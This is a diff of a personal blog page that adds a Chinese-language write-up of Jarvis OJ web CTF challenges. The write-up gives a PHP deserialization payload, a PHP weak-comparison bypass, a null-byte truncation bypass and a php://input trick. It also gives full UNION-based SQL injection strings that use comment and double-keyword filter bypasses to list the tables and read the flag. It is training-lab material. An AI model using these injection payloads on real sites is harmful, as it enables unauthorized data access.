@@ -147,12 +147,74 @@
 </nav>
 
         <div id="main">
-            <div class="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
-                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>分类</h2></a>
+            <div class="post_page_title_img" style="height: 25rem;background-image: url(https://c-ssl.duitang.com/uploads/item/201907/20/20190720111710_TNNCi.jpeg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;">
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2>jarvis OJ</h2></a>
             </div>
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
-                <script>
+                <h1 id="jarvis-OJ"><a href="#jarvis-OJ" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h1><h2 id="jarvis-OJ-1"><a href="#jarvis-OJ-1" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h2><p>神盾局<br>打开网页是一张图片<br>查看源码发现</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image1.png" title="image">
+
+<p>base64转码发现后面是shield.jpg<br>尝试一下 index.php发现如下源码</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image2.png" title="image">
+
+<p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image3.png" title="image">
+
+<p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 且不含\<br>才能到file_get_contents函数读取文件</p>
+<p>又读了一下showimg.php</p>
+<p>又读了一下showimg.php</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image4.png" title="image">
+
+<p>这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND<br>写个脚本</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image5.png" title="image"> 
+
+<p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>把这个值传入<br>注意！！是class不是之前的img 而且是从原页面上传入</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image6.png" title="image">
+
+<p>得到flag</p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>看源码啥也没有<br>看一眼robots.txt</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image7.png" title="image">
+
+<p>进这个文件 发现是假flag<br>抓包<br>admin随便改个值得到flag</p>
+<h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>查看源码</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image8.png" title="image">
+
+<p>分析<br>传入的a里如果不为0.则echo hahah并return<br>没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4<br>才能运行flag.txt<br>每个条件都存在冲突<br>id php弱比较就能绕过 传入id=0e<br>a 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下<br>b eregi可以%00截断 b=%0041111111<br>查了下大佬的wp<br>说a这里可以应用伪协议php://input<br>构造payload:<br>?id=0e&amp;a=php://input&amp;b=%004111111<br>同时post值1112 is a nice lab!<br>得到这样的回显<br>Come ON!!! {/^HT2mCpcvOLf}</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image9.png" title="image">
+
+<p>盲猜他是个地址（长得也太难认了8</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image10.png" title="image">
+
+<p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image11.png" title="image">
+
+<p>确实是sql注入<br>可以看到它这里是过滤了空格 用/<em>22</em>/绕过 回显又正常了</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image12.png" title="image">
+
+<p>先测试字段数</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image13.png" title="image">
+
+<p>说明字段为3</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image14.png" title="image">
+
+<p>双写绕过对select和union的过滤<br>数据库名<br>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,database()</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image15.png" title="image">
+
+<p>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(table_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.tables/<em>22</em>/where/<em>22</em>/table_schema=database()<br>表名</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image16.png" title="image">
+
+<p>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(column_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.columns/<em>22</em>/where/<em>22</em>/table_schema=database()/<em>22</em>/and/<em>22</em>/table_name=0x636f6e74656e74<br>列名</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image17.png" title="image">
+
+
+<p>id=-1/<em>22</em>/uniunionon/<em>22</em>/seleselectct/<em>22</em>/1,2,context/<em>22</em>/frofromm/<em>22</em>/content</p>
+<p>得到flag</p>
+<img src="/2019/11/12/Jarvis%20OJ(web)WP/Image18.png" title="image">
+
+
+
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -232,8 +294,8 @@ $('.btn_click_load').click(function() {
 -->
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://dddwmr.github.io/categories/index.html';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://dddwmr.github.io/categories/index.html'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://dddwmr.github.io/2019/11/12/Jarvis OJ(web)WP/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://dddwmr.github.io/2019/11/12/Jarvis OJ(web)WP/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
